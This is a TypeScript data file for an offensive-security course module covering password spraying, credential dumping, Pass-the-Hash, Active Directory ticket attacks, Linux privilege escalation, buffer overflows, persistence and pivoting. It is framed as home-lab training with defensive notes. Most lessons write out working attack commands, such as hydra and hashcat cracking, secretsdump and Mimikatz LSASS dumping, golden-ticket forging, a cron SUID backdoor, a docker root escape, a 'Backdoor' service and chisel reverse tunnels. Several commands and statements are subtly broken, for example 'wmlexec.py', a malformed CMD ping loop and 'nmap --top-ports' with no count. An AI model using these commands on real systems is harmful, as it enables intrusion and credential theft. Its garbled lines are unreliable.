import type { Module } from "../curriculum";

export const module28: Module = {
  id: "module-28",
  slug: "28-system-hacking-privesc",
  title: "System Hacking & Privilege Escalation",
  description:
    "Getting in is the start — getting to root/domain-admin is the win: password attacks, credential dumping, Pass-the-Hash, AD exploitation, Linux escapes, and persistence.",
  language: "Offensive",
  lessons: [
    {
      id: 1,
      slug: "01-password-attacks",
      title: "Password Attacks: Online & Offline",
      level: "intermediate",
      tag: "lab",
      duration: "50 min",
      description:
        "Dictionary, brute-force, spraying, rainbow tables, pass-the-word-list — how credentials fall and how passwords are actually defended.",
      content: `
# Password Attacks: Online & Offline

## The attacker's reality

Most initial access does not need a 0-day — it needs a password that was re-used, default, or weak. Passwords are the #1 bridge between recon and foothold.

## Online attacks (against a service)

- **Brute force**: try everything (slow; rate-limits kill it)
- **Dictionary**: try common words + mutations
- **Password spraying**: ONE common password against MANY users (avoids lockout!)
- **Default creds**: admin/admin inventory via the product's manual

\`\`\`
hydra -L users.txt -p 'Welcome1' 10.0.0.30 smb    # spray one password
hydra -l admin -P rockyou.txt 10.0.0.20 ssh        # brute one user
hydra -L users.txt -P rockyou.txt 10.0.0.20 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
\`\`\`

## Offline attacks (on the hash)

- **Dictionary**: wordlist → hash word-by-word
- **Rule-based**: mangling rules (leetspeak, suffixes, year append)
- **Mask**: known structure (e.g., "Password2024!")
- **BM (brute)**: for very short/numeric
- **Rainbow tables**: precomputed lookup (less relevant vs GPU crack)
- **GPU**: hashcat on good hardware (millions–billions pass/sec)

\`\`\`
hashcat -m 1000 -a 0 hashes.txt rockyou.txt          # NTLM
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?l?d?d'           # mask
\`\`\`

## Defense that actually works

- MFA everywhere (defeats spraying instantly)
- Long passphrases (≥12-16 chars) over "complex" short ones
- Lockout + alerting; but careful — spraying dodges lockout, so monitor
- Password managers + unique per account
- Hash-side: use salted slow hashes (bcrypt/argon2) so GPU cracking hits a wall

> Password attacks win by statistics: the wordlist covers the 90% of users who choose "correct horse battery staple" poorly. Your job is to force the cost up and the pay-off down.
`,
      defaultCode: `# spray one password against a list of users (hydra on lab SSH)
hydra -L users.txt -p 'LabPass2024!' ssh://10.0.0.20 -t 4
# offline: crack an NTLM dump you generated
hashcat -m 1000 -a 0 mydump.txt /usr/share/wordlists/rockyou.txt`,
      solution: `hydra -L users.txt -p 'LabPass2024!' ssh://10.0.0.20 -t 4
hashcat -m 1000 -a 0 mydump.txt /usr/share/wordlists/rockyou.txt`,
      hint: "Spraying dodges lockouts; offline cracking scales with hardware.",
      challenge: `**Home Lab — Attack and Defend Passwords:**
1. Enable SSH (weak) on a lab box; create user row of 100 "usernames" (lab).
2. Spray 'Password1' against your list — note lockout behavior if enabled.
3. Generate 5 hashes of YOUR OWN passwords (echo -n | md5sum). Crack with hashcat default + rules. Time it.
4. Enforce MFA on a test account (any provider) and re-try your spray.
5. Write: which control broke each attack in your lab.`,
    },
    {
      id: 2,
      slug: "02-credential-dumping",
      title: "Credential Dumping & Pass-the-Hash",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "LSASS, SAM, LSA Secrets, Mimikatz and friends — extracting credentials in-memory and moving with them instead of a password.",
      content: `
# Credential Dumping & Pass-the-Hash

## Why dump credentials

Passwords regenerate access. One foothold + flattened creds = domain-wide access. Attackers dump, spray, and move.

## The Windows targets

| Location | What's there | Tools |
|----------|--------------|-------|
| **LSASS** | Logged-in user creds/tickets in memory | Mimikatz sekurlsa, ProcDump + lsassy |
| **SAM** | Local user hashes (sometimes LM/NTLM) | reg save SAM, secretsdump |
| **LSA Secrets** | Cached domain creds, service passwords | secretsdump.py |
| **DCSync** (replication ACK) | Request password hashes from the DC directly | secretsdump -just-dc |
| **NTDS.dit** + SYSTEM | Full domain user-hash database | esedbexport / secretsdump |

## The tools

\`\`\`
# From a foothold (impacket suite on Kali)
impacket-secretsdump server/domain/user:'P@ss'@10.0.0.30
impacket-secretsdump -just-dc-ntlm domain/user:'P@ss'@10.0.0.30

# Mimikatz (on Windows host)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# ProcDump LSASS + offline extraction (EDR-friendly-ish)
procdump -ma lsass.exe lsass.dmp
# then: lsassy -d file.dmp to extract NTLM hashes offline
\`\`\`

## Pass-the-Hash (PtH)

You don't need the plaintext — the hash authenticates.

\`\`\`
# Use the NTLM hash to schedule a task / exec on another box
psexec.py domain/user@10.0.0.30 -hashes :<NTLMhash>
wmlexec.py domain/user@10.0.0.30 -hashes :<NTLMhash>
\`\`\`

## Modern challenges

- **LSA protection** (RunAsPPL): blocks Mimikatz sekurlsa unless bypassed
- **Credential Guard**: moves creds into VBS-isolated area — blocks dumping; forces alternative moves (some still via SSH or cached tickets)
- **EDR**: LSASS read access is heavily monitored (Sysmon Event ID 10, 4663, 4660)
- Defenders now hunt for mimikatz behaviors, not just the binary

## Opsec note for learning

Dumping and PtH on anything but YOUR OWN lab is both a crime and career-ending. Repeat the four-question gate before every credential move.
`,
      defaultCode: `# secretsdump against your own lab DC (authorized!)
impacket-secretsdump -just-dc-ntlm corp.local/admin:'P@ssw0rd'@10.0.0.30
# collect NTLM hashes to a file, then crack the weak ones offline
hashcat -m 1000 -a 0 dc-hashes.txt /usr/share/wordlists/rockyou.txt`,
      solution: `impacket-secretsdump -just-dc-ntlm corp.local/admin:'P@ssw0rd'@10.0.0.30
hashcat -m 1000 -a 0 dc-hashes.txt /usr/share/wordlists/rockyou.txt`,
      hint: "DCSync/MA dump > on-disk; pass the hash, not the password.",
      challenge: `**Home Lab — Dump-your-own-lab:**
1. Prot a lab DC running Windows Server; admin/test password WEAK on purpose (test only!).
2. secretsdump -just-dc-ntlm; save hashes.
3. Crack 3 weak ones with hashcat; test PtH with psexec targeting a member server.
4. Now defend: enable LSA Protection (Registry RunAsPPL) and retry sekurlsa — observe the block.
5. Write: the top 3 defense controls that would stop your own attack chain.`,
    },
    {
      id: 3,
      slug: "03-ad-exploitation-tactics",
      title: "Active Directory Attack Paths",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "Kerberoasting, AS-REP roasting, golden/silver tickets, GPO abuse, delegation — the AD attack directory blue teams fear and testers master.",
      content: `
# Active Directory Attack Paths

## The AD attack pantry (with often-abused facts)

### Kerberoasting (T1558.003)
Find service accounts with SPNs; request a service ticket; the service's password hash (RC4/AES) lives in the ticket → crack offline.

\`\`\`
impacket-GetUserSPNs -request domain/user:'P@ss' -dc-ip 10.0.0.30
# -> save TGS-REP; crack with hashcat -m 13100 (RC4) or 19700 (AES)
\`\`\`

### AS-REP roasting (T1558.004)
Users with "Do not require Kerberos pre-authentication" — request their TGT, crack offline without their password.

\`\`\`
impacket-GetNPUsers -usersfile users.txt -dc-ip 10.0.0.30 -format hashcat domain/
\`\`\`

### Pass-the-ticket / Golden ticket (T1558.001)
KRBTGT hash = forge ANY ticket for anyone, incl. domain admin. DCSync the krbtgt hash, then:

\`\`\`
impacket-ticketer -nthash <krbtgt-ntlm> -domain-sid S-1-5-... -domain corp.local fakeadmin
\`\`\`

### Other favorites
- **Silver ticket**: forge a service-level ticket (needs service hash)
- **Delegation abuse** (unconstrained/constrained/RBCD): impersonate users via Kerberos delegation flags
- **GPO abuse**: push a malicious startup script or logon script via writable GPO
- **ACL abuse**: modify another object's DACL (genericAll → reset password / add to group)

## Enumeration drives attack

BloodHound (SharpHound / bloodhound-python) graphs who-can-reach-what. Attack paths = edges.

## Defenders' counter-play

- Disable RC4; enforce AES
- Rarely use pre-auth-disabled accounts
- Stronger service account passwords (or gMSA — auto-rotated, can't Kerberoast easily)
- Monitor ticket requests/paths (event 4769 with suspicious cipher/request type)

> AD attacks are not magic — they are MySQL queries into your own directory's old defaults. Master these, and hardening AD becomes obvious.
`,
      defaultCode: `# Recount an AD attack chain in code as a roadmap
const attacks = {
  kerberoasting: 'request TGS -> crack service pass',
  asrep: 'user w/o preauth -> crack TGT',
  kerberoastFix: 'use gMSA + AES-only + monitor 4769',
  golden: 'forge tickets with krbtgt hash'
};
for (const [attack, how] of Object.entries(attacks)) {
  console.log(attack, '=>', how);
}`,
      solution: `const attacks = {
  kerberoasting: 'request TGS -> crack service pass',
  asrep: 'user w/o preauth -> crack TGT',
  kerberoastFix: 'use gMSA + AES-only + monitor 4769',
  golden: 'forge tickets with krbtgt hash'
};
for (const [attack, how] of Object.entries(attacks)) {
  console.log(attack, '=>', how);
}`,
      hint: "Kerberoast + AS-REP are reachable with low priv; Golden needs DC via krbtgt.",
      challenge: `**Home Lab — Run One Path:**
1. Lab DC + a service account with an SPN and weak password.
2. Kerberoast it (GetUserSPNs -request), crack offline with hashcat.
3. (Optional) Do the same with AS-REP Roast on a user with pre-auth disabled.
4. Draw the minimization: what SINGLE control stops your chain?
5. Write it up as a mini-finding report (severity, impact, fix).`,
    },
    {
      id: 4,
      slug: "04-linux-privilege-escalation",
      title: "Linux Privilege Escalation",
      level: "advanced",
      tag: "lab",
      duration: "55 min",
      description:
        "SUID bits, sudo misconfigs, writable cron jobs, kernel exploits, capabilities, and the enumeration that finds them — LinPEAS and manual craft.",
      content: `
# Linux Privilege Escalation

## The enumeration-first religion

Before exploit, enumerate the box fully. Low-hanging fruit abounds: misconfigured sudo, SUID, cron, world-writable scripts, exposed secrets, docker group.

## The top-5 checks

\`\`\`
# 1) sudo rights
sudo -l

# 2) SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 3) writable cron scripts
find /etc/cron* -maxdepth 2 -type f 2>/dev/null
cat /etc/crontab

# 4) unusual capabilities
getcap -r / 2>/dev/null

# 5) running as root services + environment
ps aux | grep root
env | grep -iE 'token|secret|key'
\`\`\`

Use **LinPEAS** to speed the sweep:
\`\`\`
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
\`\`\`

## Classic escalation patterns

### sudo misconfig
\`\`\`
sudo -l   # -> (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec whoami \;
\`\`\`
Tools running AS root with the ability to run commands = instant root.
Check GTFOBins (gtfobins.github.io) for any catch.

### SUID binary bugs
Python/perl/vim + SUID + scriptable → root. Again GTFOBins.

### Writable cron
\`\`\`
# attacker edits a root-run script in /usr/local/bin/backup.sh
echo 'chmod +s /bin/bash' >> /usr/local/bin/backup.sh
# wait for cron -> /bin/bash is now SUID root -> bash -p
\`\`\`

### kernel / dirty pipes
- Dirty COW (CVE-2016-5195): write to read-only files (old kernels)
- Pipe race (CVE-2022-0847): "Dirty Pipe" — write to page cache
- Use only on authorized lab kernels; verify kernel version

### docker group
\`\`\`
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
\`\`\`
Docker membership = God. Same for lxd/lxc ubuntu image mounts.

## The mindset

Every escalation = an **authorization bug**: "who can read/write/run what, and does that cross privilege." Enumerate those triples and you'll find the seam.
`,
      defaultCode: `# The enumeration loop any root you never got would do
echo '==== sudo -l ===='; sudo -l 2>/dev/null
echo '==== SUID ===='; find / -perm -4000 -type f 2>/dev/null
echo '==== cron ===='; cat /etc/crontab 2>/dev/null
echo '==== capabilities ===='; getcap -r / 2>/dev/null
echo '==== secrets in env ===='; env | grep -iE 'pass|token|key|secret'
# then: ./linpeas.sh if you can transfer it`,
      solution: `echo '==== sudo -l ===='; sudo -l 2>/dev/null
echo '==== SUID ===='; find / -perm -4000 -type f 2>/dev/null
echo '==== cron ===='; cat /etc/crontab 2>/dev/null
echo '==== capabilities ===='; getcap -r / 2>/dev/null
echo '==== secrets in env ===='; env | grep -iE 'pass|token|key|secret'
./linpeas.sh   # or its showstopper output`,
      hint: "Check sudo -l, SUID, cron, caps, secrets. Cross-reference with GTFOBins.",
      challenge: `**Home Lab — Escalate a Purpose-Built Box:**
1. Boot a privesc practice box (e.g., a HTB easy box or VulnVM like Westo).
2. Enumerate with LinPEAS; list your top 3 candidates.
3. Chain one: sudo misconfig → root, or writable cron → root.
4. Document each command and the outcome (screenshots).
5. Write: what control (sudoers config, SUID removal, cron hardening) killed your path?`,
    },
    {
      id: 5,
      slug: "05-buffer-overflow-basics",
      title: "Buffer Overflows & Memory Corruption",
      level: "advanced",
      tag: "concept",
      duration: "50 min",
      description:
        "Stack overflows, EIP/RIP overwrite, shellcode placement, and modern protections (NX, ASLR, canaries) — the theory behind classic exploitation.",
      content: `
# Buffer Overflows & Memory Corruption

## The classic stack overflow

A function reads input into a fixed-size buffer and overruns the boundary, overwriting the saved return address.

\`\`\`
char buf[64];
gets(buf);           // no bounds check!
// attacker sends 64 bytes + 4 of shoe + EIP = shellcode address
return;              // jumps to attacker's code
\`\`\`

## Anatomy of the exploit

\`\`\`
[ shellcode ][ padding ][ saved EBP ][ saved EIP -> shellcode ]
\`\`\`
- NOP sled (\\x90...) to tolerate address jitter
- EIP overwritten with address of the sled
- Shellcode = machine instructions (e.g., execve /bin/sh)

## Modern protections

| Defense | What it does | Typical bypass |
|---------|-------------|----------------|
| **NX/DEP** | Data pages aren't executable | ROP: reuse existing instructions (gadgets) |
| **ASLR** | Randomize addresses | Info leak first; or brute small entropy; or non-PIE |
| **Stack canaries** | Canary before return addr; detect smash | Leak the canary; or overwrite before it |
| **PIE** | Relocate binary itself | Info leak of a module base |
| **RELRO** | Harden GOT | Partial RELRO → GOT overwrite still possible |
| **Fortify / stack protector** | Compiler checks | Rarely bypassed without a leak |

## ROP in one line

Return-Oriented Programming: find **gadgets** (existing code sequences ending in ret), chain them so EIP walks through them — defeats NX by reusing the program's own code.

## Why care (non-exploit roles too)

- Blue team: know what "exploitable" means to size severity; want ASLR+NX+canary+PIE+RELRO defaults
- Vuln researchers: use Fuzzing + dynamic binary analysis to find them
- Detection: EDR flags unusual stack patterns, DEP-bypass behaviors

## How to learn safely

Pwn/CTF academies (pwn.college, ROP Emporium) run on modern-hardened practice binaries. NEVER practice memory corruption on anything you don't own.

> Memory corruption is the deepest well in offensive security. Start with pwn.college's beginner course; everything after is refinement.
`,
      defaultCode: `# Visualize the stack layout for a 64-byte buffer
const bufferBytes = 64;
const savedEbp = 4;
const savedRip = 8;
const offset = bufferBytes + savedEbp;
console.log('Pad', offset, 'bytes then overwrite RIP (+', savedRip, ')');
console.log('Classic: NOP sled + shellcode + padding + EIP');`,
      solution: `const bufferBytes = 64;
const savedEbp = 4;
const savedRip = 8;
const offset = bufferBytes + savedEbp;
console.log('Pad', offset, 'bytes then overwrite RIP (+', savedRip, ')');
console.log('Classic: NOP sled + shellcode + padding + EIP');`,
      hint: "Offset to EIP, control EIP, jump to your code (or ROP chain).",
      challenge: `**Home Lab — First Taste (Practice Box):**
1. Create an account at pwn.college (or use the free "pwn 101" module).
2. Complete the 'Hello, World' and 'First Overflow' beginner labs.
3. Note: what protections are on? What's the offset?
4. Answer: why does a modern compile default insert a canary?
5. Write 3 sentences connecting this to 'Blue team defense' defaults you might set as an admin.`,
    },
    {
      id: 6,
      slug: "06-persistence-techniques",
      title: "Persistence & Lateral Movement",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "Registry run keys, services, scheduled tasks, SSH keys, WMI subscriptions, DC squatting — surviving reboots and moving sideways like a pro.",
      content: `
# Persistence & Lateral Movement

## Persistence: the adversary's sneakers

A foothold that dies on reboot is a demo. Real adversaries persist: survive reboots, updates, and some cleanups.

### Windows persistence spots

\`\`\`
# Registry Run keys (user & machine, stable classic)
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v updater /t REG_SZ /d "C:\\Windows\\Tasks\\updater.exe"

# Services (MUST be installed with rights)
sc create Backdoor type= own start= auto binPath= "C:\\Windows\\pwn.exe"

# Scheduled tasks (system-level)
schtasks /create /tn Update /sc onlogon /tr cmd.exe /ru SYSTEM

# WMI event subscription (fires on time/startup, deep in WMI)
# (tools: SharpWMI, PayloadsAllTheThings-WMI)

# Startup folder
echo payload > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat"
\`\`\`

### Linux persistence

- SSH keys in authorized_keys
- Cron jobs (root crontab)
- systemd units (a service file + enable)
- LD_PRELOAD in /etc/ld.so.preload
- rc.local / /etc/init.d

### Sneaky favorites
- **AppInit_DLLs** / **image hijacking** (App Paths)
- **COM hijack** — replace a legit COM handler path (Win)
- **DC accounts / azure**: add a new admin user with hidden MFA rights
- **Browser extensions** (rare but real)

## Lateral movement

- Remote service + hash (psexec-like)
- WMI (remote execution)
- Scheduled tasks over IPC (schtasks /s target)
- WinRM / PowerShell remoting (5985/5986)
- SSH pivots (ssh -R reverse)
- RDP with stolen creds; token impersonation

\`\`\`
impacket-wmiexec domain/user@10.0.0.31 -hashes :<NTLM>
impacket-psexec domain/user@10.0.0.31 -hashes :<NTLM>
evil-winrm -i 10.0.0.31 -u user -p 'pass'   # WinRM
\`\`\`

## Detection reminder

Persistence = one of the loudest phases. Blue teams look at: new scheduled tasks (106), service creation (7045), Run keys (event 13 via Sysmon), WMI activity (19-21).
`,
      defaultCode: `# Model the persistence taxonomy for your own notes
const persistence = {
  windows: ['run-key','service','schtask','wmi-sub'],
  linux: ['ssh-key','cron','systemd','ld-preload'],
  defense: { monitorEvents: ['Sysmon 13','Event 7045','Event 106'] }
};
for (const [os, spots] of Object.entries(persistence)) {
  if (os === 'defense') continue;
  console.log(os, '->', spots.join(', '));
}`,
      solution: `const persistence = {
  windows: ['run-key','service','schtask','wmi-sub'],
  linux: ['ssh-key','cron','systemd','ld-preload'],
  defense: { monitorEvents: ['Sysmon 13','Event 7045','Event 106'] }
};
for (const [os, spots] of Object.entries(persistence)) {
  if (os === 'defense') continue;
  console.log(os, '->', spots.join(', '));
}`,
      hint: "Know every persistence spot so you can defend it: sysmon + event 7045/13.",
      challenge: `**Home Lab — Persist & Detect:**
1. On your lab Windows VM, install a harmless persistence (a Run key that writes a test log).
2. Reboot; confirm it fires.
3. In your SIEM-ish notes: which event IDs would your monitoring see?
4. Clean it: remove the key; verify removal works.
5. Write: rank these persistence methods by detectability — services, run keys, WMI — and explain.`,
    },
    {
      id: 7,
      slug: "07-post-exploit-and-pivoting",
      title: "Post-Exploitation & Pivoting",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "Where to go after the shell: recon from inside, tunnelling (SOCKS/proxychains, SSH, Metasploit pivot), and moving to the real objective.",
      content: `
# Post-Exploitation & Pivoting

## After the shell — in the network

\`\`\`
# From inside the box
ipconfig /all; route print      # Windows
ip a; ip route                  # Linux
netstat -ano                    # what's listening/connected
whoami /all                     # your exact rights
arp -a                          # LAN topology peek

# New network discovery
for /f %i in (1..254) do @ping -n 1 10.0.5.%i -w 300 | find "TTL"
\`\`\`
The "aha" moment: a mounted internal segment that route print showed.

## Pivoting (using the foothold as a router)

### SSH dynamic forwarding (jump host to internal network)
\`\`\`
ssh -D 1080 user@foothold   # SOCKS proxy on Kali:1080
# then configure:
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf
proxychains nmap --top-ports -sT 10.0.5.10
\`\`\`

### Metasploit route + portscan module
\`\`\`
run post/multi/manage/autoroute
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.5.10
\`\`\`

### chisel (modern favorite)
\`\`\`
# foothold: chisel client -R 9000:socks
chisel server -p 8080 --reverse on kali
./chisel client Kali:8080 R:9000:socks   on the foothold
# then proxychains nmap via 127.0.0.1:9000
\`\`\`

## Network pivots vs agent pivots

- SOCKS (network pivot): all tools proxied
- Agent-based (MSF route): context sessions only
- Port forward (local): specific target port to your box (e.g., \`ssh -L\`)

## Collecting toward the goal

- Sensitive files, configs, credentials in transit
- Map what's reachable; guess the objective (what would the client most fear losing)
- Screenshot evidence; keep note of every credential/token used

## The ethics brake

Pivoting accelerates into other people's networks FAST. Outside your lab: stop at the first boundary that isn't in your RoE and expand scope in WRITING.

> Post-exploitation is where advanced attackers prove their value and where careless testers find themselves exposed. Map, mark, move—then report honestly.
`,
      defaultCode: `# SOCKS pivot via SSH then scan through it
ssh -D 1080 user@10.0.0.20
# In another shell:
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf
proxychains nmap --top-ports 20 -sT 10.0.5.10
# Hitting 10.0.5.x proves the pivot works.`,
      solution: `ssh -D 1080 user@10.0.0.20
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf
proxychains nmap --top-ports 20 -sT 10.0.5.10`,
      hint: "Dynamic forward + proxychains = scan the far side through your foothold.",
      challenge: `**Home Lab — Build a Pivot:**
1. Create a 3-node lab: Kali -> DMZ-box (2 NICs) -> Internal target (host-only net).
2. Gain a shell on DMZ-box; ssh -D SOCKS from Kali through it.
3. via proxychains, nmap the internal target; reach an HTTP service there.
4. Try chisel (server/client) as the alternative pivot.
5. Write: proxychains vs MSF autoroute vs chisel — pros/cons, and when each shines.`,
    },
  ],
};